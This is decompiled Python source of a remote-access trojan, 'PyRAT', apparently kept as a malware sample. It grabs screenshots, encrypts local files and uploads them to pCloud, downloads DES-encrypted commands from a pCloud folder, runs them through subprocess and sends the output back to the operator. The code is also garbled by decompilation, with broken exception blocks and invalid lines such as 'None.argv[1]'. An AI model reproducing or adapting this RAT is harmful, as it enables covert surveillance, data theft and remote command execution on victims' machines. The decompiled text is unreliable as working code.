# Source Generated with Decompyle++
# File: PyRAT_malware_sample_please_dont_bop_me_soc.pyc (Python 3.10)

import subprocess
import requests
import urllib3
import string
import random
import time
import sys
from os import remove
from Crypto.Cipher import DES
from Crypto.Hash import SHA256 as SHA
from Crypto.Cipher import ARC4
from PIL import ImageGrab
from datetime import datetime
from base64 import b64decode
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class PyRAT:
    
    def __init__(self, token):
        self.token = token
        self.headers = {
            'Authorization': f'''Bearer {self.token}''' }
        self.bot_id = ''
        self.folder_id = ''

    
    def encryption(self, data, key):
        
        try:
            rc4 = ARC4.new(key)
            result = rc4.encrypt(data)
        finally:
            return result
            Exception
            e = None
            
            try:
                pass
            finally:
                e = None
                del e
                return 0
                e = None
                del e

    def set_bot_id(self):
        N = 16
        for i in range(N):
            self.bot_id += str(random.choice(string.ascii_uppercase))

    
    def encrypt_file(self, path, out_path):
        try:
            key = []
            for i in range(len(self.bot_id)):
                key.append(ord(self.bot_id[i]) ^ ord(self.token[i]))
            ret = self.encryption(open(path, 'rb').read(), bytes(key))
            f = open(out_path, 'wb')
            f.write(ret)
            f.close()
        finally:
            return True
            Exception
            e = None
            
            try:
                pass
            finally:
                e = None
                del e
                return False
                e = None
                del e

    
    def get_pcloud_file_list(self):
        
        try:
            url = 'https://api.pcloud.com/listfolder'
            params = {
                'folderid': self.folder_id if self.folder_id else 0 }
            response = requests.get(url, self.headers, params, False, **('headers', 'params', 'verify'))
            response.raise_for_status()
            data = response.json()
        finally:
            return None
            requests.exceptions.RequestException
            e = None
            
            try:
                print(f'''Error: {e}''')
            finally:
                e = None
                del e
                return None
                e = None
                del e



    
    def check_commandfile(self, file_list):
        
        try:
            if not file_list:
                print('No files found.')
        finally:
            return None
            for item in file_list['metadata']['contents']:
                if item['name'] == 'CMD':
                    pass
                return None
            return None
            Exception
            e = None
            
            try:
                pass
            finally:
                e = None
                del e
                return None
                e = None
                del e

    def create_pcloud_folder(self, folder_name, parent_folder_id = (None,)):
        
        try:
            url = 'https://api.pcloud.com/createfolder'
            data = {
                'name': folder_name,
                'folderid': parent_folder_id if parent_folder_id else 0 }
            response = requests.post(url, self.headers, data, False, **('headers', 'data', 'verify'))
            response.raise_for_status()
            data = response.json()
            self.folder_id = data['metadata']['id'].replace('d', '')
        finally:
            return None
            requests.exceptions.RequestException
            e = None
            
            try:
                print(f'''Error: {e}''')
            finally:
                e = None
                del e
                return None
                e = None
                del e


    def upload_to_pcloud(self, local_file_path, remote_folder_id = (None,)):
        
        try:
            url = 'https://api.pcloud.com/uploadfile'
            if self.encrypt_file(local_file_path, local_file_path + '.tmp'):
                local_file_path = local_file_path + '.tmp'
            data = {
                'file': (local_file_path.split('/')[-1], open(local_file_path, 'rb')) }
            params = {
                'folderid': remote_folder_id if remote_folder_id else 0 }
            response = requests.post(url, self.headers, data, params, False, **('headers', 'files', 'params', 'verify'))
            response.raise_for_status()
            data = response.json()
            remove(local_file_path)
        finally:
            return True
            requests.exceptions.RequestException
            e = None
            
            try:
                print(f'''Error: {e}''')
                remove(local_file_path)
            finally:
                e = None
                del e
                return None
                e = None
                del e

    
    def get_capture(self):
        
        try:
            name = datetime.today().strftime('%Y%m%d%H%M%S') + '.jpg'
            img = ImageGrab.grab()
            img.save(name)
            self.upload_to_pcloud(name, self.folder_id)
            remove(name)
        finally:
            return name
            Exception
            e = None
            
            try:
                pass
            finally:
                e = None
                del e
                return False
                e = None
                del e

    
    def download_pcloud_file(self, save_path):
        
        try:
            url = f'''https://api.pcloud.com/getfilelink?path=/{self.bot_id}/CMD&forcedownload=1&skipfilename=1'''
            response = requests.get(url, self.headers, False, **('headers', 'verify'))
            response.raise_for_status()
            data = response.json()
            download_url = data['hosts'][0] + data['path']
            download_response = requests.get('http://' + download_url, False, **('verify',))
            with open(save_path, 'wb') as f:
                f.write(download_response.content)
                None(None, None, None)
                return True
                with None:
                    if not None:
                        pass
        finally:
            return True
            requests.exceptions.RequestException
            e = None
            
            try:
                pass
            finally:
                e = None
                del e
                return False
                e = None
                del e



    
    def decrypt_command(self, data):
        
        try:
            hash = SHA.new()
            hash.update(self.bot_id.encode('utf-8'))
            key = hash.digest()[:8]
            des = DES.new(key, DES.MODE_ECB)
            d = des.decrypt(b64decode(data))
        finally:
            return d
            Exception
            e = None
            
            try:
                pass
            finally:
                e = None
                del e
                return d
                e = None
                del e



    
    def command_handler(self, command):
        
        try:
            cmd = self.decrypt_command(command).split(b'|')
            if b'1' == cmd[0]:
                cmd_ret = subprocess.getstatusoutput(cmd[1].decode())
                cmd_f = open(cmd[1].decode(), 'w')
                cmd_f.write(cmd_ret[1])
                cmd_f.close()
                self.upload_to_pcloud(cmd[1].decode(), self.folder_id)
                remove(cmd[1].decode())
            if b'2' == cmd[0]:
                self.upload_to_pcloud(cmd[1].decode(), self.folder_id)
        finally:
            return None
            return None
            Exception
            e = None
            
            try:
                pass
            finally:
                e = None
                del e
                return None
                e = None
                del e





def Init(token):
    
    try:
        pyrat = PyRAT(token)
        pyrat.set_bot_id()
        bot_folder_id = pyrat.create_pcloud_folder(pyrat.bot_id)
        if bot_folder_id != None:
            pyrat.get_capture()
            file_list = pyrat.get_pcloud_file_list()
            cmd_id = pyrat.check_commandfile(file_list)
            if cmd_id != None and pyrat.download_pcloud_file(pyrat.bot_id):
                cmd = open(pyrat.bot_id, 'rb').read()
                pyrat.command_handler(cmd)
                remove(pyrat.bot_id)
            time.sleep(10)
            if not bot_folder_id != None:
                pass
            return None
        return None
        Exception
        e = None
        
        try:
            pass
        finally:
            e = None
            del e
            return None
            e = None
            del e



if len(sys.argv) != 2:
    print('Usage ' + sys.argv[0] + ' <Token>')
    return None
token = None.argv[1]
Init(token)
